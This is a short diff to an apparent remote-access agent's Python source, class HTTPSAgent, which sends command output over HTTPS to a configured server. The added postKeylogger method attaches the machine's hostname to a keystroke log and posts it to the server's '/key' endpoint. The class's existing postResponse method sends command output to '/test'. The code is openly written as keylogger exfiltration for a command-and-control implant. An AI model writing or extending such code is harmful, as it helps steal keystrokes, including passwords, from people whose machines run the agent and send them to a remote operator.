@@ -25,7 +25,15 @@ class HTTPSAgent(LocalAgent):
 		connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
 		connection.request('POST', resource, cmd_output + os.linesep, headers)
 		response = connection.getresponse().read().decode()
-        
+   
+	def postKeylogger(self, log):
+		try:
+			payload = socket.gethostname() + "\n" + log
+			print(payload)
+			self.postHTTPS(self.headers, '/key', payload)
+		except Exception as e:
+			print("Oops, something went wrong: {}".format(e), file=sys.stderr)
+
 	def postResponse(self, cmd_output):
 		try:
 			self.postHTTPS(self.headers, '/test', cmd_output)
